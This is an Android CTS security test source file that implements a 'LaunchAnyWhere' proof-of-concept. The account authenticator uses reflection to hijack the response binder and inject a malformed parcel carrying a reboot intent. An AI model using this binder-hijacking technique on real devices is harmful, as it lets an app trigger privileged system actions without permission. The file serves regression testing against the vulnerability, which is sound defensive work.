/**
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.android.security.cts.launchanywhere;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.os.RemoteException;

import java.io.FileDescriptor;
import java.lang.reflect.Field;

public class Authenticator extends AbstractAccountAuthenticator {
    static public IGenerateMalformedParcel exploit;

    private int TRANSACTION_onResult;
    private IBinder mOriginRemote;
    private IBinder mProxyRemote = new IBinder() {
        @Override
        public String getInterfaceDescriptor() throws RemoteException {
            return null;
        }

        @Override
        public boolean pingBinder() {
            return false;
        }

        @Override
        public boolean isBinderAlive() {
            return false;
        }

        @Override
        public IInterface queryLocalInterface(String descriptor) {
            return null;
        }

        @Override
        public void dump(FileDescriptor fd, String[] args) throws RemoteException {}

        @Override
        public void dumpAsync(FileDescriptor fd, String[] args)
        throws RemoteException {}

        @Override
        public boolean transact(int code, Parcel data, Parcel reply, int flags)
        throws RemoteException {
        if (code == TRANSACTION_onResult) {
            data.recycle();
            Intent payload = new Intent();
            payload.setAction(Intent.ACTION_REBOOT);
            data = exploit.generate(payload);
        }

        mOriginRemote.transact(code, data, reply, flags);
        return true;
        }

        @Override
        public void linkToDeath(DeathRecipient recipient, int flags)
        throws RemoteException {}

        @Override
        public boolean unlinkToDeath(DeathRecipient recipient, int flags) {
            return false;
        }
    };

    public Authenticator(Context context) {
        super(context);
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return null;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response,
            String accountType) {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response,
            Account account, String authTokenType, Bundle options) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response,
            String accountType, String authTokenType, String[] requiredFeatures,
            Bundle options) {
        try {
            Field mAccountAuthenticatorResponseField =
                Class.forName("android.accounts.AccountAuthenticatorResponse")
                .getDeclaredField("mAccountAuthenticatorResponse");

            mAccountAuthenticatorResponseField.setAccessible(true);

            Object mAccountAuthenticatorResponse =
                mAccountAuthenticatorResponseField.get(response);

            Class stubClass = null;
            String responseName = "android.accounts.IAccountAuthenticatorResponse";
            Class<?>[] classes = Class.forName(responseName).getDeclaredClasses();

            String stubName = responseName + ".Stub";
            for (Class inner : classes) {
                if (inner.getCanonicalName().equals(stubName)) {
                    stubClass = inner;
                    break;
                }
            }

            Field TRANSACTION_onResultField =
                stubClass.getDeclaredField("TRANSACTION_onResult");
            TRANSACTION_onResultField.setAccessible(true);
            TRANSACTION_onResult = TRANSACTION_onResultField.getInt(null);

            Class proxyClass = null;
            String proxyName = stubName + ".Proxy";
            for (Class inner : stubClass.getDeclaredClasses()) {
                if (inner.getCanonicalName().equals(proxyName)) {
                    proxyClass = inner;
                    break;
                }
            }

            Field mRemoteField = proxyClass.getDeclaredField("mRemote");
            mRemoteField.setAccessible(true);
            mOriginRemote = (IBinder) mRemoteField.get(mAccountAuthenticatorResponse);
            mRemoteField.set(mAccountAuthenticatorResponse, mProxyRemote);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return new Bundle();
    }

    @Override
    public Bundle confirmCredentials(
            AccountAuthenticatorResponse response, Account account, Bundle options) {
        return null;
            }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response,
            Account account, String authTokenType, Bundle options) {
        return null;
    }

    @Override
    public Bundle hasFeatures(
            AccountAuthenticatorResponse response, Account account, String[] features)
    {
        return null;
    }
}